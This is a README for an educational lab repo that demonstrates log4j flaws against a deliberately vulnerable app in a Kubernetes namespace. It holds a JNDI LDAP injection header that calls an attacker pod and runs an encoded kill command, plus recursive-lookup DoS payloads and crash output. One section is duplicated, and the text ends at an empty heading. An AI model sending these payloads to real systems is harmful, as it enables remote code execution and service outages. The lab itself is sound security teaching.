# Showcase log4j vulnerability

**Updates**
- 2021-12-20: added working exampele for DoS based on log4j 2.16.0

This repo is for educational purposes. I do neither endorse nor encourage any mailicious use of this repo. It requires a Kubernetes environment to run the app and the tests.

Credits go to Eden Federman and Christophe Tafani-Dereeper, Tejas Nagchandi their repos/posts gave me the inspiration and motivation for testing.

- https://medium.com/@edeNFed/patching-log4shell-in-one-command-without-downtime-using-ephemeral-containers-c69a9155ab1e
- https://github.com/christophetd/log4shell-vulnerable-app.git
- https://github.com/tejas-nagchandi/CVE-2021-45105

`modified-files` contains the different changes for building the springboot app with different versions of log4j and different settings. You can apply these to your copy of `https://github.com/christophetd/log4shell-vulnerable-app.git` and `https://github.com/tejas-nagchandi/CVE-2021-45105`, or use the images I have built for each step, as described in `ops/manifests/deployment.yaml`

## Install

1. `kubectl create ns log4jpoc`
1. `kubectl -n log4jpoc apply -f ops/manifests`

and check the status: `kubectl -n log4jpoc get pods`

## Run the ldap attack

1. Run a curl container (as a replacement for a remote attacker): `kubectl -n log4jpoc run --rm -it client --image=curlimages/curl -- /bin/sh` 
1. Run the curl-command: `curl http://vulnerable-app:8080 -H 'X-Api-Version: ${jndi:ldap://attacker:1389/Basic/Command/Base64/cGtpbGwgamF2YQo=}'`

## Run the DoS attack (log4j 2.14)

1. Run a curl container (as a replacement for a remote attacker): `kubectl -n log4jpoc run --rm -it client --image=curlimages/curl -- /bin/sh` 
1. `curl http://vulnerable-app:8080 -H 'X-Api-Version: ${${::-${::-$${::-j}}}}'`

## Run the DoS attack (log4j 2.16)

1. Run a curl container (as a replacement for a remote attacker): `kubectl -n log4jpoc run --rm -it client --image=curlimages/curl -- /bin/sh` 
1. `## Run the DoS attack (log4j 2.16)

1. Run a curl container (as a replacement for a remote attacker): `kubectl -n log4jpoc run --rm -it client --image=curlimages/curl -- /bin/sh` 
1. `curl http://vulnerable-app:8080 -H 'X-Api-Version: ${${::-${::-$${::-j}}}}'`
`


## Results 

### With log4j 2.14.1

Applying the ldap attack causes the pod to crash:

```
$ kubectl -n pwnd get pods
NAME             READY   STATUS    RESTARTS   AGE
attacker         1/1     Running   0          13h
client           1/1     Running   0          58s
vulnerable-app   0/1     Error     1          12h
```

Applying the second attack causes an infinite loop:

```
2021-12-19 10:48:33,685 http-nio-8080-exec-1 ERROR An exception occurred processing Appender Console java.lang.IllegalStateException: Infinite loop in property interpolation of ::-${::-$${::-j}}: :
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.checkCyclicSubstitution(StrSubstitutor.java:1081)
```

### With log4j 2.16.0

Applying the ldap attack does not break the app anymore:

```
$ kubectl -n pwnd get pods
NAME             READY   STATUS    RESTARTS       AGE
attacker         1/1     Running   0              13h
vulnerable-app   1/1     Running   1 (114s ago)   10m
client           1/1     Running   0              92s
```

See here for more details: https://issues.apache.org/jira/plugins/servlet/mobile#issue/LOG4J2-3230

This attack needs to be run against the docker image built from this repo: `https://github.com/tejas-nagchandi/CVE-2021-45105`
### With log4j 2.17.0
